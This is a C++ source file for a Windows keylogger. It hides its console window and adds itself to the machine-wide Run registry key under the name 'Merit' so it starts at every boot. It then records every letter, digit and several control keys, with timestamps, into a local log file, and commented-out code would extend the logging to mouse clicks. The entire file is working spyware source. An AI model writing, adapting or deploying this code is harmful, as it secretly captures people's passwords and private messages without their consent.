#include "resource.h"
#include <iostream>
#include<thread>
#include <conio.h>
#include<stdlib.h>
#include<windows.h>
#include <Mmsystem.h> 
#include <fstream>
#include <vector>
#include <time.h>

#pragma comment(lib, "Winmm.lib") 
#define KEY_DOWN(key_name) ((GetAsyncKeyState(key_name)& 0x8001)?1:0)
#define KEY_UP(key_name) ((GetAsyncKeyState(key_name)& 0x8001)?0:1)
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) 
using namespace std;

#define FILE_PATH "./balck_hand.txt"

vector<string> GKeyBuf;

bool ModifyRegedit(bool bAutoRun)
{
	char pFileName[MAX_PATH] = { 0 };
	DWORD dwRet = GetModuleFileNameA(NULL, (LPSTR)pFileName, MAX_PATH);
	std::cout << pFileName;
	HKEY hKey;
	LPCSTR lpRun = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	long lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey);
	if (lRet != ERROR_SUCCESS)
	{
		std::cout << "failed";
		return false;
	}


	if (bAutoRun)
		RegSetValueA(hKey, "Merit", (DWORD)REG_SZ, (LPCSTR)pFileName, MAX_PATH);
	else
		RegDeleteValueA(hKey, "Merit");
	RegCloseKey(hKey);
	return true;
}

void write2file(const char* filePath, string data)
{

	ofstream outFile;
	outFile.open(filePath, ios::out | ios::app);
	if (outFile.is_open()) {
		cout << "ofstream open " << filePath << "error" << endl;
	}

	outFile << data;

	outFile.flush();

	outFile.close();
}

void get_local_time(SYSTEMTIME& sys_time)
{
	GetLocalTime(&sys_time);
}

int main()
{
	ModifyRegedit(true);
	bool hasPress[100];
	for (int i = 0; i < sizeof(hasPress); i++) {
		hasPress[i] = false;
	}

	auto itr = GKeyBuf.begin();

	time_t start_time = 0;
	time_t next_time = 0;
	time(&start_time);
	double time_span = 0;

	bool write_status = false;


	for (;;)
	{
		itr = GKeyBuf.begin();
		
		if (GKeyBuf.size() == 1)
		{
			time(&next_time);

			time_span = difftime(next_time, start_time);
			if (time_span > 10)
			{
				if (write_status) {
					write2file(FILE_PATH, "\r\n");
				}
				
				SYSTEMTIME system_time;
				get_local_time(system_time);

				char time_buf[50];

				int format_len = snprintf(time_buf, 50, "[time]%4d/%02d/%02d %02d:%02d:%02d.%03d 星期%1d\n", system_time.wYear, system_time.wMonth,
					system_time.wDay, system_time.wHour, system_time.wMinute, system_time.wSecond, system_time.wMilliseconds, system_time.wDayOfWeek);


				write2file(FILE_PATH, time_buf);

				write_status = false;

			}

			write2file(FILE_PATH, GKeyBuf.front());
			GKeyBuf.erase(itr);

			start_time = next_time;
		}

		if (KEY_DOWN('A')) {
			if (hasPress[0] == false) {
				hasPress[0] = true;
				GKeyBuf.push_back("A");
				write_status = true;
			}		
		}
		if (KEY_UP('A')) {
			hasPress[0] = false;
		}

		if (KEY_DOWN('B')) {
			if (hasPress[1] == false) {
				hasPress[1] = true;
				GKeyBuf.push_back("B");
				write_status = true;
			}		
		}

		if (KEY_UP('B')) {
			hasPress[1] = false;
		}

		if (KEY_DOWN('C')) {
			if (hasPress[2] == false) {
				hasPress[2] = true;
				GKeyBuf.push_back("C");
				write_status = true;
			}
		}
		if (KEY_UP('C')) {
			hasPress[2] = false;
		}

		if (KEY_DOWN('D')) {
			if (hasPress[3] == false) {
				hasPress[3] = true;
				GKeyBuf.push_back("D");
				write_status = true;
			}
		}
		if (KEY_UP('D')) {
			hasPress[3] = false;
		}

		if (KEY_DOWN('E')) {
			if (hasPress[4] == false) {
				hasPress[4] = true;
				GKeyBuf.push_back("E");
				write_status = true;
			}
		}
		if (KEY_UP('E')) {
			hasPress[4] = false;
		}

		if (KEY_DOWN('F')) {
			if (hasPress[5] == false) {
				hasPress[5] = true;
				GKeyBuf.push_back("F");
				write_status = true;
			}
		}
		if (KEY_UP('F')) {
			hasPress[5] = false;
		}

		if (KEY_DOWN('G')) {
			if (hasPress[6] == false) {
				hasPress[6] = true;
				GKeyBuf.push_back("G");
				write_status = true;
			}
		}
		if (KEY_UP('G')) {
			hasPress[6] = false;
		}

		if (KEY_DOWN('H')) {
			if (hasPress[7] == false) {
				hasPress[7] = true;
				GKeyBuf.push_back("H");
				write_status = true;
			}
		}
		if (KEY_UP('H')) {
			hasPress[7] = false;
		}

		if (KEY_DOWN('I')) {
			if (hasPress[8] == false) {
				hasPress[8] = true;
				GKeyBuf.push_back("I");
				write_status = true;
			}
		}
		if (KEY_UP('I')) {
			hasPress[8] = false;
		}

		if (KEY_DOWN('J')) {
			if (hasPress[9] == false) {
				hasPress[9] = true;
				GKeyBuf.push_back("J");
				write_status = true;
			}
		}
		if (KEY_UP('J')) {
			hasPress[9] = false;
		}

		if (KEY_DOWN('K')) {
			if (hasPress[10] == false) {
				hasPress[10] = true;
				GKeyBuf.push_back("K");
				write_status = true;
			}
		}
		if (KEY_UP('K')) {
			hasPress[10] = false;
		}

		if (KEY_DOWN('L')) {
			if (hasPress[11] == false) {
				hasPress[11] = true;
				GKeyBuf.push_back("L");
				write_status = true;
			}
		}
		if (KEY_UP('L')) {
			hasPress[11] = false;
		}

		if (KEY_DOWN('M')) {
			if (hasPress[12] == false) {
				hasPress[12] = true;
				GKeyBuf.push_back("M");
				write_status = true;
			}
		}
		if (KEY_UP('M')) {
			hasPress[12] = false;
		}

		if (KEY_DOWN('N')) {
			if (hasPress[13] == false) {
				hasPress[13] = true;
				GKeyBuf.push_back("N");
				write_status = true;
			}
		}
		if (KEY_UP('N')) {
			hasPress[13] = false;
		}

		if (KEY_DOWN('O')) {
			if (hasPress[14] == false) {
				hasPress[14] = true;
				GKeyBuf.push_back("O");
				write_status = true;
			}
		}
		if (KEY_UP('O')) {
			hasPress[14] = false;
		}

		if (KEY_DOWN('P')) {
			if (hasPress[15] == false) {
				hasPress[15] = true;
				GKeyBuf.push_back("P");
				write_status = true;
			}
		}
		if (KEY_UP('P')) {
			hasPress[15] = false;
		}

		if (KEY_DOWN('Q')) {
			if (hasPress[16] == false) {
				hasPress[16] = true;
				GKeyBuf.push_back("Q");
				write_status = true;
			}
		}
		if (KEY_UP('Q')) {
			hasPress[16] = false;
		}

		if (KEY_DOWN('R')) {
			if (hasPress[17] == false) {
				hasPress[17] = true;
				GKeyBuf.push_back("R");
				write_status = true;
			}
		}
		if (KEY_UP('R')) {
			hasPress[17] = false;
		}

		if (KEY_DOWN('S')) {
			if (hasPress[18] == false) {
				hasPress[18] = true;
				GKeyBuf.push_back("S");
				write_status = true;
			}
		}
		if (KEY_UP('S')) {
			hasPress[18] = false;
		}

		if (KEY_DOWN('T')) {
			if (hasPress[19] == false) {
				hasPress[19] = true;
				GKeyBuf.push_back("T");
				write_status = true;
			}
		}
		if (KEY_UP('T')) {
			hasPress[19] = false;
		}

		if (KEY_DOWN('U')) {
			if (hasPress[20] == false) {
				hasPress[20] = true;
				GKeyBuf.push_back("U");
				write_status = true;
			}
		}
		if (KEY_UP('U')) {
			hasPress[20] = false;
		}

		if (KEY_DOWN('V')) {
			if (hasPress[21] == false) {
				hasPress[21] = true;
				GKeyBuf.push_back("V");
				write_status = true;
			}
		}
		if (KEY_UP('V')) {
			hasPress[21] = false;
		}

		if (KEY_DOWN('W')) {
			if (hasPress[22] == false) {
				hasPress[22] = true;
				GKeyBuf.push_back("W");
				write_status = true;
			}
		}
		if (KEY_UP('W')) {
			hasPress[22] = false;
		}
		
		if (KEY_DOWN('X')) {
			if (hasPress[23] == false) {
				hasPress[23] = true;
				GKeyBuf.push_back("X");
				write_status = true;
			}
		}
		if (KEY_UP('X')) {
			hasPress[23] = false;
		}

		if (KEY_DOWN('Y')) {
			if (hasPress[24] == false) {
				hasPress[24] = true;
				GKeyBuf.push_back("Y");
				write_status = true;
			}
		}
		if (KEY_UP('Y')) {
			hasPress[24] = false;
		}

		if (KEY_DOWN('Z')) {
			if (hasPress[25] == false) {
				hasPress[25] = true;
				GKeyBuf.push_back("Z");
				write_status = true;
			}
		}
		if (KEY_UP('Z')) {
			hasPress[25] = false;
		}

		if (KEY_DOWN('1')) {
			if (hasPress[26] == false) {
				hasPress[26] = true;
				if (hasPress[37]) {
					GKeyBuf.push_back("!");
				}
				else {
					GKeyBuf.push_back("1");
				}
				
				write_status = true;
			}
		}
		if (KEY_UP('1')) {
			hasPress[26] = false;
		}

		if (KEY_DOWN('2')) {
			if (hasPress[27] == false) {
				hasPress[27] = true;
				GKeyBuf.push_back("2");
				write_status = true;
			}
		}
		if (KEY_UP('2')) {
			hasPress[27] = false;
		}

		if (KEY_DOWN('3')) {
			if (hasPress[28] == false) {
				hasPress[28] = true;
				GKeyBuf.push_back("3");
				write_status = true;
			}
		}
		if (KEY_UP('3')) {
			hasPress[28] = false;
		}

		if (KEY_DOWN('4')) {
			if (hasPress[29] == false) {
				hasPress[29] = true;
				GKeyBuf.push_back("4");
				write_status = true;
			}
		}
		if (KEY_UP('4')) {
			hasPress[29] = false;
		}

		if (KEY_DOWN('5')) {
			if (hasPress[30] == false) {
				hasPress[30] = true;
				GKeyBuf.push_back("5");
				write_status = true;
			}
		}
		if (KEY_UP('5')) {
			hasPress[30] = false;
		}

		if (KEY_DOWN('6')) {
			if (hasPress[31] == false) {
				hasPress[31] = true;
				GKeyBuf.push_back("6");
				write_status = true;
			}
		}
		if (KEY_UP('6')) {
			hasPress[31] = false;
		}

		if (KEY_DOWN('7')) {
			if (hasPress[32] == false) {
				hasPress[32] = true;
				GKeyBuf.push_back("7");
				write_status = true;
			}
		}
		if (KEY_UP('7')) {
			hasPress[32] = false;
		}

		if (KEY_DOWN('8')) {
			if (hasPress[33] == false) {
				hasPress[33] = true;
				GKeyBuf.push_back("8");
				write_status = true;
			}
		}
		if (KEY_UP('8')) {
			hasPress[33] = false;
		}

		if (KEY_DOWN('9')) {
			if (hasPress[34] == false) {
				hasPress[34] = true;
				GKeyBuf.push_back("9");
				write_status = true;
			}
		}
		if (KEY_UP('9')) {
			hasPress[34] = false;
		}

		if (KEY_DOWN('0')) {
			if (hasPress[35] == false) {
				hasPress[35] = true;
				GKeyBuf.push_back("0");
				write_status = true;
			}
		}
		if (KEY_UP('0')) {
			hasPress[35] = false;
		}

		// 空格
		if (KEY_DOWN(32)) {
			if (hasPress[36] == false) {
				hasPress[36] = true;
				GKeyBuf.push_back("[space]");
				write_status = true;
			}
		}
		if (KEY_UP(32)) {
			hasPress[36] = false;
		}

		// Shift
		if (KEY_DOWN(16)) {
			if (hasPress[37] == false) {
				hasPress[37] = true;
				GKeyBuf.push_back("[shift]");
				write_status = true;
			}
		}
		if (KEY_UP(16)) {
			hasPress[37] = false;
		}

		// Enter
		if (KEY_DOWN(13)) {
			if (hasPress[38] == false) {
				hasPress[38] = true;
				GKeyBuf.push_back("[enter]");
				write_status = true;
			}
		}
		if (KEY_UP(13)) {
			hasPress[38] = false;
		}

		// backspace
		if (KEY_DOWN(8)) {
			if (hasPress[39] == false) {
				hasPress[39] = true;
				GKeyBuf.push_back("[back]");
				write_status = true;
			}
		}
		if (KEY_UP(8)) {
			hasPress[39] = false;
		}

		// 鼠标左键
// 		if (KEY_DOWN(VK_LBUTTON)) {
// 			if (hasPress[40] == false) {
// 				hasPress[40] = true;
// 				GKeyBuf.push_back("[L]");
// 				write_status = true;
// 			}
// 		}
// 		if (KEY_UP(VK_LBUTTON)) {
// 			hasPress[40] = false;
// 		}

		// 鼠标右键
// 		if (KEY_DOWN(VK_RBUTTON)) {
// 			if (hasPress[41] == false) {
// 				hasPress[41] = true;
// 				GKeyBuf.push_back("[R]");
// 				write_status = true;
// 			}
// 		}
// 		if (KEY_UP(VK_RBUTTON)) {
// 			hasPress[41] = false;
// 		}
	}
	
}